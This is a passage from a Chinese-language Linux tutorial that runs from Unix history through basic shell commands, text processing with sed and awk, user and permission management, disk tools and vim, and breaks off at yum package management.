1974年：Unix推出了里程碑意义的第5版，几乎完全用C语言来实现。 1979年：从Unix第7版开始，AT&amp;T发布新的使用条款，将Unix私有化。 1987年：Andrew S. Tanenbaum教授为了能在课堂上为学生讲解操作系统运作的细节，决定在不使用任何AT&amp;T的源代码前提下，自行开发与Unix兼容的操作系统以避免版权上的争议，该系统被命名为Minix。 1991年：Linus Torvalds就读于芬兰赫尔辛基大学期间，尝试在Minix上做一些开发工作，但因为Minix只是作为教学用途的操作系统，功能并不强大，为了方便在学校的新闻组和邮件系统中读写和下载文件，Linus编写了磁盘驱动程序和文件系统，这些东西形成了Linux系统内核的雏形。 下图是Unix操作系统家族的图谱。 Linux概述Linux是一个通用操作系统。一个操作系统要负责任务调度、内存分配、处理外围设备I/O等操作。操作系统通常由内核（运行其他程序，管理像磁盘、打印机等硬件设备的核心程序）和系统程序（设备驱动、底层库、shell、服务程序等）两部分组成。 Linux内核是芬兰人Linus Torvalds开发的，于1991年9月发布。而Linux操作系统作为Internet时代的产物，它是由全世界许多开发者共同合作开发的，是一个自由的操作系统（注意自由和免费并不是同一个概念，想了解二者的差别可以点击这里）。 Linux系统优点 通用操作系统，不跟特定的硬件绑定。 用C语言编写，可移植性强，有内核编程接口。 支持多用户和多任务，支持安全的分层文件系统。 大量的实用程序，完善的网络功能以及强大的支持文档。 可靠的安全性和良好的稳定性，对开发者更友好。 Linux系统发行版本 Redhat Ubuntu CentOS Fedora Debian openSUSE 基础命令Linux系统的命令通常都是如下所示的格式： 命令名称 [命名参数] [命令对象] 获取登录信息 - w / who / last/ lastb。 [root ~]# w 23:31:16 up 12:16, 2 users, load average: 0.00, 0.01, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root pts/0 182.139.66.250 23:03 4.00s 0.02s 0.00s w jackfrue pts/1 182.139.66.250 23:26 3:56 0.00s 0.00s -bash [root ~]# who root pts/0 2018-04-12 23:03 (182.139.66.250) jackfrued pts/1 2018-04-12 23:26 (182.139.66.250) [root ~]# who am i root pts/0 2018-04-12 23:03 (182.139.66.250) [root ~]# who mom likes root pts/0 2018-04-12 23:03 (182.139.66.250) [root ~]# last root pts/0 117.136.63.184 Sun May 26 18:57 still logged in reboot system boot 3.10.0-957.10.1. Mon May 27 02:52 - 19:10 (-7:-42) root pts/4 117.136.63.184 Sun May 26 18:51 - crash (08:01) root pts/4 117.136.63.184 Sun May 26 18:49 - 18:49 (00:00) root pts/3 117.136.63.183 Sun May 26 18:35 - crash (08:17) root pts/2 117.136.63.183 Sun May 26 18:34 - crash (08:17) root pts/0 117.136.63.183 Sun May 26 18:10 - crash (08:42) 查看自己使用的Shell - ps。 Shell也被称为“壳”或“壳程序”，它是用户与操作系统内核交流的翻译官，简单的说就是人与计算机交互的界面和接口。目前很多Linux系统默认的Shell都是bash（Bourne Again SHell），因为它可以使用tab键进行命令和路径补全、可以保存历史命令、可以方便的配置环境变量以及执行批处理操作。 [root ~]# ps PID TTY TIME CMD 3531 pts/0 00:00:00 bash 3553 pts/0 00:00:00 ps 查看命令的说明和位置 - whatis / which / whereis。 [root ~]# whatis ps ps (1) - report a snapshot of the current processes. [root ~]# whatis python python (1) - an interpreted, interactive, object-oriented programming language [root ~]# whereis ps ps: /usr/bin/ps /usr/share/man/man1/ps.1.gz [root ~]# whereis python python: /usr/bin/python /usr/bin/python2.7 /usr/lib/python2.7 /usr/lib64/python2.7 /etc/python /usr/include/python2.7 /usr/share/man/man1/python.1.gz [root ~]# which ps /usr/bin/ps [root ~]# which python /usr/bin/python 清除屏幕上显示的内容 - clear。 查看帮助文档 - man / info / –help / apropos。 [root@izwz97tbgo9lkabnat2lo8z ~]# ps --help Usage: ps [options] Try 'ps --help &lt;simple|list|output|threads|misc|all&gt;' or 'ps --help &lt;s|l|o|t|m|a&gt;' for additional help text. For more details see ps(1). [root@izwz97tbgo9lkabnat2lo8z ~]# man ps PS(1) User Commands PS(1) NAME ps - report a snapshot of the current processes. SYNOPSIS ps [options] DESCRIPTION ... 查看系统和主机名 - uname / hostname。 [root@izwz97tbgo9lkabnat2lo8z ~]# uname Linux [root@izwz97tbgo9lkabnat2lo8z ~]# hostname izwz97tbgo9lkabnat2lo8z [root@iZwz97tbgo9lkabnat2lo8Z ~]# cat /etc/centos-release CentOS Linux release 7.6.1810 (Core) 说明：cat是连接文件内容并打印到标准输出的命令，后面会讲到该命令；/etc是Linux系统上的一个非常重要的目录，它保存了很多的配置文件；centos-release是该目录下的一个文件，因为我自己使用的Linux发行版本是CentOS 7.6，因此这里会有一个这样的文件。 时间和日期 - date / cal。 [root@iZwz97tbgo9lkabnat2lo8Z ~]# date Wed Jun 20 12:53:19 CST 2018 [root@iZwz97tbgo9lkabnat2lo8Z ~]# cal June 2018 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 [root@iZwz97tbgo9lkabnat2lo8Z ~]# cal 5 2017 May 2017 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 重启和关机 - reboot / shutdown。 [root ~]# shutdown -h +5 Shutdown scheduled for Sun 2019-05-26 19:34:27 CST, use 'shutdown -c' to cancel. [root ~]# Broadcast message from root (Sun 2019-05-26 19:29:27 CST): The system is going down for power-off at Sun 2019-05-26 19:34:27 CST! [root ~]# shutdown -c Broadcast message from root (Sun 2019-05-26 19:30:22 CST): The system shutdown has been cancelled at Sun 2019-05-26 19:31:22 CST! [root ~]# shutdown -r 23:58 Shutdown scheduled for Sun 2019-05-26 23:58:00 CST, use 'shutdown -c' to cancel. [root ~]# shutdown -c Broadcast message from root (Sun 2019-05-26 19:31:06 CST): The system shutdown has been cancelled at Sun 2019-05-26 19:32:06 CST! 说明：在执行shutdown命令时会向登录系统的用户发出警告，可以在命令后面跟上警告消息来替换默认的警告消息，也可以在-h参数后通过now来表示立刻关机。 退出登录 - exit / logout。 查看历史命令 - history。 [root@iZwz97tbgo9lkabnat2lo8Z ~]# history ... 452 ls 453 cd Python-3.6.5/ 454 clear 455 history [root@iZwz97tbgo9lkabnat2lo8Z ~]# !454 说明：查看到历史命令之后，可以用!历史命令编号来重新执行该命令；通过history -c可以清除历史命令。 实用程序文件和文件夹操作 创建/删除空目录 - mkdir / rmdir。 [root ~]# mkdir abc [root ~]# mkdir -p xyz/abc [root ~]# rmdir abc 创建/删除文件 - touch / rm。 [root ~]# touch readme.txt [root ~]# touch error.txt [root ~]# rm error.txt rm: remove regular empty file ‘error.txt’? y [root ~]# rm -rf xyz touch命令用于创建空白文件或修改文件时间。在Linux系统中一个文件有三种时间： 更改内容的时间 - mtime。 更改权限的时间 - ctime。 最后访问时间 - atime。 rm的几个重要参数： -i：交互式删除，每个删除项都会进行询问。 -r：删除目录并递归的删除目录中的文件和目录。 -f：强制删除，忽略不存在的文件，没有任何提示。 切换和查看当前工作目录 - cd / pwd。 说明：cd命令后面可以跟相对路径（以当前路径作为参照）或绝对路径（以/开头）来切换到指定的目录，也可以用cd ..来返回上一级目录。请大家想一想，如果要返回到上上一级目录应该给cd命令加上什么样的参数呢？ 查看目录内容 - ls。 -l：以长格式查看文件和目录。 -a：显示以点开头的文件和目录（隐藏文件）。 -R：遇到目录要进行递归展开（继续列出目录下面的文件和目录）。 -d：只列出目录，不列出其他内容。 -S / -t：按大小/时间排序。 查看文件内容 - cat / tac / head / tail / more / less / rev / od。 [root ~]# wget http://www.sohu.com/ -O sohu.html --2018-06-20 18:42:34-- http://www.sohu.com/ Resolving www.sohu.com (www.sohu.com)... 14.18.240.6 Connecting to www.sohu.com (www.sohu.com)|14.18.240.6|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 212527 (208K) [text/html] Saving to: ‘sohu.html’ 100%[==================================================&gt;] 212,527 --.-K/s in 0.03s 2018-06-20 18:42:34 (7.48 MB/s) - ‘sohu.html’ saved [212527/212527] [root ~]# cat sohu.html ... [root ~]# head -10 sohu.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;搜狐&lt;/title&gt; &lt;meta name=\"Keywords\" content=\"搜狐,门户网站,新媒体,网络媒体,新闻,财经,体育,娱乐,时尚,汽车,房产,科技,图片,论坛,微博,博客,视频,电影,电视剧\"/&gt; &lt;meta name=\"Description\" content=\"搜狐网为用户提供24小时不间断的最新资讯，及搜索、邮件等网络服务。内容包括全球热点事件、突发新闻、时事评论、热播影视剧、体育赛事、行业动态、生活服务信息，以及论坛、博客、微博、我的搜狐等互动空间。\" /&gt; &lt;meta name=\"shenma-site-verification\" content=\"1237e4d02a3d8d73e96cbd97b699e9c3_1504254750\"&gt; &lt;meta charset=\"utf-8\"/&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge,chrome=1\"/&gt; [root ~]# tail -2 sohu.html &lt;/body&gt; &lt;/html&gt; [root ~]# less sohu.html ... [root ~]# cat -n sohu.html | more ... 说明：上面用到了一个名为wget的命令，它是一个网络下载器程序，可以从指定的URL下载资源。 拷贝/移动文件 - cp / mv。 [root ~]# mkdir backup [root ~]# cp sohu.html backup/ [root ~]# cd backup [root backup]# ls sohu.html [root backup]# mv sohu.html sohu_index.html [root backup]# ls sohu_index.html 文件重命名 - rename。 [root@iZwz97tbgo9lkabnat2lo8Z ~]# rename .htm .html *.htm 查找文件和查找内容 - find / grep。 [root@iZwz97tbgo9lkabnat2lo8Z ~]# find / -name \"*.html\" /root/sohu.html /root/backup/sohu_index.html [root@izwz97tbgo9lkabnat2lo8z ~]# find . -atime 7 -type f -print [root@izwz97tbgo9lkabnat2lo8z ~]# find . -type f -size +2k [root@izwz97tbgo9lkabnat2lo8z ~]# find . -type f -name \"*.swp\" -delete [root@iZwz97tbgo9lkabnat2lo8Z ~]# grep \"&lt;script&gt;\" sohu.html -n 20:&lt;script&gt; [root@iZwz97tbgo9lkabnat2lo8Z ~]# grep -E \\&lt;\\/?script.*\\&gt; sohu.html -n 20:&lt;script&gt; 22:&lt;/script&gt; 24:&lt;script src=\"//statics.itc.cn/web/v3/static/js/es5-shim-08e41cfc3e.min.js\"&gt;&lt;/script&gt; 25:&lt;script src=\"//statics.itc.cn/web/v3/static/js/es5-sham-1d5fa1124b.min.js\"&gt;&lt;/script&gt; 26:&lt;script src=\"//statics.itc.cn/web/v3/static/js/html5shiv-21fc8c2ba6.js\"&gt;&lt;/script&gt; 29:&lt;script type=\"text/javascript\"&gt; 52:&lt;/script&gt; ... 说明：grep在搜索字符串时可以使用正则表达式，如果需要使用正则表达式可以用grep -E或者直接使用egrep。 创建链接和查看链接 - ln / readlink。 [root@iZwz97tbgo9lkabnat2lo8Z ~]# ls -l sohu.html -rw-r--r-- 1 root root 212131 Jun 20 19:15 sohu.html [root@iZwz97tbgo9lkabnat2lo8Z ~]# ln /root/sohu.html /root/backup/sohu_backup [root@iZwz97tbgo9lkabnat2lo8Z ~]# ls -l sohu.html -rw-r--r-- 2 root root 212131 Jun 20 19:15 sohu.html [root@iZwz97tbgo9lkabnat2lo8Z ~]# ln /root/sohu.html /root/backup/sohu_backup2 [root@iZwz97tbgo9lkabnat2lo8Z ~]# ls -l sohu.html -rw-r--r-- 3 root root 212131 Jun 20 19:15 sohu.html [root@iZwz97tbgo9lkabnat2lo8Z ~]# ln -s /etc/centos-release sysinfo [root@iZwz97tbgo9lkabnat2lo8Z ~]# ls -l sysinfo lrwxrwxrwx 1 root root 19 Jun 20 19:21 sysinfo -&gt; /etc/centos-release [root@iZwz97tbgo9lkabnat2lo8Z ~]# cat sysinfo CentOS Linux release 7.4.1708 (Core) [root@iZwz97tbgo9lkabnat2lo8Z ~]# cat /etc/centos-release CentOS Linux release 7.4.1708 (Core) 说明：链接可以分为硬链接和软链接（符号链接）。硬链接可以认为是一个指向文件数据的指针，就像Python中对象的引用计数，每添加一个硬链接，文件的对应链接数就增加1，只有当文件的链接数为0时，文件所对应的存储空间才有可能被其他文件覆盖。我们平常删除文件时其实并没有删除硬盘上的数据，我们删除的只是一个指针，或者说是数据的一条使用记录，所以类似于“文件粉碎机”之类的软件在“粉碎”文件时除了删除文件指针，还会在文件对应的存储区域填入数据来保证文件无法再恢复。软链接类似于Windows系统下的快捷方式，当软链接链接的文件被删除时，软链接也就失效了。 压缩/解压缩和归档/解归档 - gzip / gunzip / xz。 [root@iZwz97tbgo9lkabnat2lo8Z ~]# wget http://download.redis.io/releases/redis-4.0.10.tar.gz --2018-06-20 19:29:59-- http://download.redis.io/releases/redis-4.0.10.tar.gz Resolving download.redis.io (download.redis.io)... 109.74.203.151 Connecting to download.redis.io (download.redis.io)|109.74.203.151|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1738465 (1.7M) [application/x-gzip] Saving to: ‘redis-4.0.10.tar.gz’ 100%[==================================================&gt;] 1,738,465 70.1KB/s in 74s 2018-06-20 19:31:14 (22.9 KB/s) - ‘redis-4.0.10.tar.gz’ saved [1738465/1738465] [root@iZwz97tbgo9lkabnat2lo8Z ~]# ls redis* redis-4.0.10.tar.gz [root@iZwz97tbgo9lkabnat2lo8Z ~]# gunzip redis-4.0.10.tar.gz [root@iZwz97tbgo9lkabnat2lo8Z ~]# ls redis* redis-4.0.10.tar 归档和解归档 - tar。 [root@iZwz97tbgo9lkabnat2lo8Z ~]# tar -xvf redis-4.0.10.tar redis-4.0.10/ redis-4.0.10/.gitignore redis-4.0.10/00-RELEASENOTES redis-4.0.10/BUGS redis-4.0.10/CONTRIBUTING redis-4.0.10/COPYING redis-4.0.10/INSTALL redis-4.0.10/MANIFESTO redis-4.0.10/Makefile redis-4.0.10/README.md redis-4.0.10/deps/ redis-4.0.10/deps/Makefile redis-4.0.10/deps/README.md ... 说明：归档（也称为创建归档）和解归档都使用tar命令，通常创建归档需要-cvf三个参数，其中c表示创建（create），v表示显示创建归档详情（verbose），f表示指定归档的文件（file）；解归档需要加上-xvf参数，其中x表示抽取（extract），其他两个参数跟创建归档相同。 将标准输入转成命令行参数 - xargs。 下面的命令会将查找当前路径下的html文件，然后通过xargs将这些文件作为参数传给rm命令，实现查找并删除文件的操作。 [root@iZwz97tbgo9lkabnat2lo8Z ~]# find . -type f -name \"*.html\" | xargs rm -f 下面的命令将a.txt文件中的多行内容变成一行输出到b.txt文件中，其中&lt;表示从a.txt中读取输入，&gt;表示将命令的执行结果输出到b.txt中。 [root@iZwz97tbgo9lkabnat2lo8Z ~]# xargs &lt; a.txt &gt; b.txt 说明：这个命令就像上面演示的那样常在管道（实现进程间通信的一种方式）和重定向（重新指定输入输出的位置）操作中用到，后面的内容中会讲到管道操作和输入输出重定向操作。 显示文件或目录 - basename / dirname。 其他相关工具。 sort - 对内容排序 uniq - 去掉相邻重复内容 tr - 替换指定内容为新内容 cut / paste - 剪切/黏贴内容 split - 拆分文件 file - 判断文件类型 wc - 统计文件行数、单词数、字节数 iconv - 编码转换 [root ~]# cat foo.txt grape apple pitaya [root ~]# cat bar.txt 100 200 300 400 [root ~]# paste foo.txt bar.txt grape 100 apple 200 pitaya 300 400 [root ~]# paste foo.txt bar.txt &gt; hello.txt [root ~]# cut -b 4-8 hello.txt pe 10 le 20 aya 3 0 [root ~]# cat hello.txt | tr '\\t' ',' grape,100 apple,200 pitaya,300 ,400 [root ~]# split -l 100 sohu.html hello [root ~]# wget https://www.baidu.com/img/bd_logo1.png [root ~]# file bd_logo1.png bd_logo1.png: PNG image data, 540 x 258, 8-bit colormap, non-interlaced [root ~]# wc sohu.html 2979 6355 212527 sohu.html [root ~]# wc -l sohu.html 2979 sohu.html [root ~]# wget http://www.qq.com -O qq.html [root ~]# iconv -f gb2312 -t utf-8 qq.html 管道和重定向 管道的使用 - **|**。 例子：查找当前目录下文件个数。 [root ~]# find ./ | wc -l 6152 例子：列出当前路径下的文件和文件夹，给每一项加一个编号。 [root ~]# ls | cat -n 1 dump.rdb 2 mongodb-3.6.5 3 Python-3.6.5 4 redis-3.2.11 5 redis.conf 例子：查找record.log中包含AAA，但不包含BBB的记录的总数 [root ~]# cat record.log | grep AAA | grep -v BBB | wc -l 输出重定向和错误重定向 - &gt; / &gt;&gt; / **2&gt;**。 [root ~]# cat readme.txt banana apple grape apple grape watermelon pear pitaya [root ~]# cat readme.txt | sort | uniq &gt; result.txt [root ~]# cat result.txt apple banana grape pear pitaya watermelon 输入重定向 - **&lt;**。 [root ~]# echo 'hello, world!' &gt; hello.txt [root ~]# wall &lt; hello.txt [root ~]# Broadcast message from root (Wed Jun 20 19:43:05 2018): hello, world! [root ~]# echo 'I will show you some code.' &gt;&gt; hello.txt [root ~]# wall &lt; hello.txt [root ~]# Broadcast message from root (Wed Jun 20 19:43:55 2018): hello, world! I will show you some code. 多重定向 - tee。 下面的命令除了在终端显示命令ls的结果之外，还会追加输出到ls.txt文件中。 [root ~]# ls | tee -a ls.txt 别名 alias [root ~]# alias ll='ls -l' [root ~]# alias frm='rm -rf' [root ~]# ll ... drwxr-xr-x 2 root root 4096 Jun 20 12:52 abc ... [root ~]# frm abc unalias [root ~]# unalias frm [root ~]# frm sohu.html -bash: frm: command not found 文本处理 字符流编辑器 - sed。 sed是操作、过滤和转换文本内容的工具。假设有一个名为fruit.txt的文件，内容如下所示。 [root ~]# cat -n fruit.txt 1 banana 2 grape 3 apple 4 watermelon 5 orange 接下来，我们在第2行后面添加一个pitaya。 [root ~]# sed '2a pitaya' fruit.txt banana grape pitaya apple watermelon orange 注意：刚才的命令和之前我们讲过的很多命令一样并没有改变fruit.txt文件，而是将添加了新行的内容输出到终端中，如果想保存到fruit.txt中，可以使用输出重定向操作。 在第2行前面插入一个waxberry。 [root ~]# sed '2i waxberry' fruit.txt banana waxberry grape apple watermelon orange 删除第3行。 [root ~]# sed '3d' fruit.txt banana grape watermelon orange 删除第2行到第4行。 [root ~]# sed '2,4d' fruit.txt banana orange 将文本中的字符a替换为@。 [root ~]# sed 's#a#@#' fruit.txt b@nana gr@pe @pple w@termelon or@nge 将文本中的字符a替换为@，使用全局模式。 [root ~]# sed 's#a#@#g' fruit.txt b@n@n@ gr@pe @pple w@termelon or@nge 模式匹配和处理语言 - awk。 awk是一种编程语言，也是Linux系统中处理文本最为强大的工具，它的作者之一和现在的维护者就是之前提到过的Brian Kernighan（ken和dmr最亲密的伙伴）。通过该命令可以从文本中提取出指定的列、用正则表达式从文本中取出我们想要的内容、显示指定的行以及进行统计和运算，总之它非常强大。 假设有一个名为fruit2.txt的文件，内容如下所示。 [root ~]# cat fruit2.txt 1 banana 120 2 grape 500 3 apple 1230 4 watermelon 80 5 orange 400 显示文件的第3行。 [root ~]# awk 'NR==3' fruit2.txt 3 apple 1230 显示文件的第2列。 [root ~]# awk '{print $2}' fruit2.txt banana grape apple watermelon orange 显示文件的最后一列。 [root ~]# awk '{print $NF}' fruit2.txt 120 500 1230 80 400 输出末尾数字大于等于300的行。 [root ~]# awk '{if($3 &gt;= 300) {print $0}}' fruit2.txt 2 grape 500 3 apple 1230 5 orange 400 上面展示的只是awk命令的冰山一角，更多的内容留给读者自己在实践中去探索。 用户管理 创建和删除用户 - useradd / userdel。 [root home]# useradd hellokitty [root home]# userdel hellokitty -d - 创建用户时为用户指定用户主目录 -g - 创建用户时指定用户所属的用户组 创建和删除用户组 - groupadd / groupdel。 说明：用户组主要是为了方便对一个组里面所有用户的管理。 修改密码 - passwd。 [root ~]# passwd hellokitty New password: Retype new password: passwd: all authentication tokens updated successfully. 说明：输入密码和确认密码没有回显且必须一气呵成的输入完成（不能使用退格键），密码和确认密码需要一致。如果使用passwd命令时没有指定命令作用的对象，则表示要修改当前用户的密码。如果想批量修改用户密码，可以使用chpasswd命令。 -l / -u - 锁定/解锁用户。 -d - 清除用户密码。 -e - 设置密码立即过期，用户登录时会强制要求修改密码。 -i - 设置密码过期多少天以后禁用该用户。 查看和修改密码有效期 - chage。 设置hellokitty用户100天后必须修改密码，过期前15天通知该用户，过期后15天禁用该用户。 chage -M 100 -W 15 -I 7 hellokitty 切换用户 - su。 [root ~]# su hellokitty [hellokitty root]$ 以管理员身份执行命令 - sudo。 [hellokitty ~]$ ls /root ls: cannot open directory /root: Permission denied [hellokitty ~]$ sudo ls /root [sudo] password for hellokitty: 说明：如果希望用户能够以管理员身份执行命令，用户必须要出现在sudoers名单中，sudoers文件在 /etc目录下，如果希望直接编辑该文件也可以使用下面的命令。 编辑sudoers文件 - visudo。 这里使用的编辑器是vi，关于vi的知识在后面有讲解。该文件的部分内容如下所示： ## Allow root to run any commands anywhere root ALL=(ALL) ALL ## Allows members of the 'sys' group to run networking, software, ## service management apps and more. # %sys ALL = NETWORKING, SOFTWARE, SERVICES, STORAGE, DELEGATING, PROCESSES, LOCATE, DRIVERS ## Allows people in group wheel to run all commands %wheel ALL=(ALL) ALL ## Same thing without a password # %wheel ALL=(ALL) NOPASSWD: ALL ## Allows members of the users group to mount and unmount the ## cdrom as root # %users ALL=/sbin/mount /mnt/cdrom, /sbin/umount /mnt/cdrom ## Allows members of the users group to shutdown this system # %users localhost=/sbin/shutdown -h now 显示用户与用户组的信息 - id。 给其他用户发消息 -write / wall。 发送方： [root ~]# write hellokitty Dinner is on me. Call me at 6pm. 接收方： [hellokitty ~]$ Message from root on pts/0 at 17:41 ... Dinner is on me. Call me at 6pm. EOF 查看/设置是否接收其他用户发送的消息 - mesg。 [hellokitty ~]$ mesg is y [hellokitty ~]$ mesg n [hellokitty ~]$ mesg is n 文件系统文件和路径 命名规则：文件名的最大长度与文件系统类型有关，一般情况下，文件名不应该超过255个字符，虽然绝大多数的字符都可以用于文件名，但是最好使用英文大小写字母、数字、下划线、点这样的符号。文件名中虽然可以使用空格，但应该尽可能避免使用空格，否则在输入文件名时需要用将文件名放在双引号中或者通过\\对空格进行转义。 扩展名：在Linux系统下文件的扩展名是可选的，但是使用扩展名有助于对文件内容的理解。有些应用程序要通过扩展名来识别文件，但是更多的应用程序并不依赖文件的扩展名，就像file命令在识别文件时并不是依据扩展名来判定文件的类型。 隐藏文件：以点开头的文件在Linux系统中是隐藏文件（不可见文件）。 目录结构 /bin - 基本命令的二进制文件。 /boot - 引导加载程序的静态文件。 /dev - 设备文件。 /etc - 配置文件。 /home - 普通用户主目录的父目录。 /lib - 共享库文件。 /lib64 - 共享64位库文件。 /lost+found - 存放未链接文件。 /media - 自动识别设备的挂载目录。 /mnt - 临时挂载文件系统的挂载点。 /opt - 可选插件软件包安装位置。 /proc - 内核和进程信息。 /root - 超级管理员用户主目录。 /run - 存放系统运行时需要的东西。 /sbin - 超级用户的二进制文件。 /sys - 设备的伪文件系统。 /tmp - 临时文件夹。 /usr - 用户应用目录。 /var - 变量数据目录。 访问权限 chmod - 改变文件模式比特。 [root ~]# ls -l ... -rw-r--r-- 1 root root 211878 Jun 19 16:06 sohu.html ... [root ~]# chmod g+w,o+w sohu.html [root ~]# ls -l ... -rw-rw-rw- 1 root root 211878 Jun 19 16:06 sohu.html ... [root ~]# chmod 644 sohu.html [root ~]# ls -l ... -rw-r--r-- 1 root root 211878 Jun 19 16:06 sohu.html ... 说明：通过上面的例子可以看出，用chmod改变文件模式比特有两种方式：一种是字符设定法，另一种是数字设定法。除了chmod之外，可以通过umask来设定哪些权限将在新文件的默认权限中被删除。 长格式查看目录或文件时显示结果及其对应权限的数值如下表所示。 chown - 改变文件所有者。 [root ~]# ls -l ... -rw-r--r-- 1 root root 54 Jun 20 10:06 readme.txt ... [root ~]# chown hellokitty readme.txt [root ~]# ls -l ... -rw-r--r-- 1 hellokitty root 54 Jun 20 10:06 readme.txt ... chgrp - 改变用户组。 磁盘管理 列出文件系统的磁盘使用状况 - df。 [root ~]# df -h Filesystem Size Used Avail Use% Mounted on /dev/vda1 40G 5.0G 33G 14% / devtmpfs 486M 0 486M 0% /dev tmpfs 497M 0 497M 0% /dev/shm tmpfs 497M 356K 496M 1% /run tmpfs 497M 0 497M 0% /sys/fs/cgroup tmpfs 100M 0 100M 0% /run/user/0 磁盘分区表操作 - fdisk。 [root ~]# fdisk -l Disk /dev/vda: 42.9 GB, 42949672960 bytes, 83886080 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0x000a42f4 Device Boot Start End Blocks Id System /dev/vda1 * 2048 83884031 41940992 83 Linux Disk /dev/vdb: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes 磁盘分区工具 - parted。 格式化文件系统 - mkfs。 [root ~]# mkfs -t ext4 -v /dev/sdb -t - 指定文件系统的类型。 -c - 创建文件系统时检查磁盘损坏情况。 -v - 显示详细信息。 文件系统检查 - fsck。 转换或拷贝文件 - dd。 挂载/卸载 - mount / umount。 创建/激活/关闭交换分区 - mkswap / swapon / swapoff。 说明：执行上面这些命令会带有一定的风险，如果不清楚这些命令的用法，最好不用随意使用，在使用的过程中，最好对照参考资料进行操作，并在操作前确认是否要这么做。 编辑器 - vim 启动vim。可以通过vi或vim命令来启动vim，启动时可以指定文件名来打开一个文件，如果没有指定文件名，也可以在保存的时候指定文件名。 [root ~]# vim guess.py 命令模式、编辑模式和末行模式：启动vim进入的是命令模式（也称为Normal模式），在命令模式下输入英文字母i会进入编辑模式（Insert模式），屏幕下方出现-- INSERT --提示；在编辑模式下按下Esc会回到命令模式，此时如果输入英文:会进入末行模式，在末行模式下输入q!可以在不保存当前工作的情况下强行退出vim；在命令模式下输入v会进入可视模式（Visual模式），可以用光标选择一个区域再完成对应的操作。 保存和退出vim：在命令模式下输入: 进入末行模式，输入wq可以实现保存退出；如果想放弃编辑的内容输入q!强行退出，这一点刚才已经提到过了；在命令模式下也可以直接输入ZZ实现保存退出。如果只想保存文件不退出，那么可以在末行模式下输入w；可以在w后面输入空格再指定要保存的文件名。 光标操作。 在命令模式下可以通过h、j、k、l来控制光标向左、下、上、右的方向移动，可以在字母前输入数字来表示移动的距离，例如：10h表示向左移动10个字符。 在命令模式下可以通过Ctrl+y和Ctrl+e来实现向上、向下滚动一行文本的操作，可以通过Ctrl+f和Ctrl+b来实现向前和向后翻页的操作。 在命令模式下可以通过输入英文字母G将光标移到文件的末尾，可以通过gg将光标移到文件的开始，也可以通过在G前输入数字来将光标移动到指定的行。 文本操作。 删除：在命令模式下可以用dd来删除整行；可以在dd前加数字来指定删除的行数；可以用d$来实现删除从光标处删到行尾的操作，也可以通过d0来实现从光标处删到行首的操作；如果想删除一个单词，可以使用dw；如果要删除全文，可以在输入:%d（其中:用来从命令模式进入末行模式）。 复制和粘贴：在命令模式下可以用yy来复制整行；可以在yy前加数字来指定复制的行数；可以通过p将复制的内容粘贴到光标所在的地方。 撤销和恢复：在命令模式下输入u可以撤销之前的操作；通过Ctrl+r可以恢复被撤销的操作。 对内容进行排序：在命令模式下输入%!sort。 查找和替换。 查找操作需要输入/进入末行模式并提供正则表达式来匹配与之对应的内容，例如：/doc.*\\.，输入n来向前搜索，也可以输入N来向后搜索。 替换操作需要输入:进入末行模式并指定搜索的范围、正则表达式以及替换后的内容和匹配选项，例如：:1,$s/doc.*/hello/gice，其中： g - global：全局匹配。 i - ignore case：忽略大小写匹配。 c - confirm：替换时需要确认。 e - error：忽略错误。 参数设定：在输入:进入末行模式后可以对vim进行设定。 设置Tab键的空格数：set ts=4 设置显示/不显示行号：set nu / set nonu 设置启用/关闭高亮语法：syntax on / syntax off 设置显示标尺（光标所在的行和列）： set ruler 设置启用/关闭搜索结果高亮：set hls / set nohls 说明：如果希望上面的这些设定在每次启动vim时都能自动生效，需要将这些设定写到用户主目录下的.vimrc文件中。 高级技巧 比较多个文件。 [root ~]# vim -d foo.txt bar.txt 打开多个文件。 [root ~]# vim foo.txt bar.txt hello.txt 启动vim后只有一个窗口显示的是foo.txt，可以在末行模式中输入ls查看到打开的三个文件，也可以在末行模式中输入b &lt;num&gt;来显示另一个文件，例如可以用:b 2将bar.txt显示出来，可以用:b 3将hello.txt显示出来。 拆分和切换窗口。 可以在末行模式中输入sp或vs来实现对窗口的水平或垂直拆分，这样我们就可以同时打开多个编辑窗口，通过按两次Ctrl+w就可以实现编辑窗口的切换，在一个窗口中执行退出操作只会关闭对应的窗口，其他的窗口继续保留。 映射快捷键：在vim下可以将一些常用操作映射为快捷键来提升工作效率。 例子1：在命令模式下输入F4执行从第一行开始删除10000行代码的操作。 :map &lt;F4&gt; gg10000dd。 例子2：在编辑模式下输入__main直接补全为if __name__ == '__main__':。 :inoremap __main if __name__ == '__main__': 说明：上面例子2的inoremap中的i表示映射的键在编辑模式使用， nore表示不要递归，这一点非常重要，否则如果键对应的内容中又出现键本身，就会引发递归（相当于进入了死循环）。如果希望映射的快捷键每次启动vim时都能生效，需要将映射写到用户主目录下的.vimrc文件中。 录制宏。 在命令模式下输入qa开始录制宏（其中a是寄存器的名字，也可以是其他英文字母或0-9的数字）。 执行你的操作（光标操作、编辑操作等），这些操作都会被录制下来。 如果录制的操作已经完成了，按q结束录制。 通过@a（a是刚才使用的寄存器的名字）播放宏，如果要多次执行宏可以在前面加数字，例如100@a表示将宏播放100次。 可以试一试下面的例子来体验录制宏的操作，该例子来源于Harttle Land网站，该网站上提供了很多关于vim的使用技巧，有兴趣的可以了解一下。 软件安装和配置使用包管理工具 yum - Yellowdog Updater Modified。 yum search：搜索软件包，例如yum search nginx。 yum list installed：列出已经安装的软件包，例如yum list installed | grep zlib。 yum install：安装软件包，例如yum install nginx。 yum remove：删除软件包，例如yum remove nginx。 yum update：更新软件包，例如yum update可以更新所有软件包，而yum update tar只会更新tar。 yum 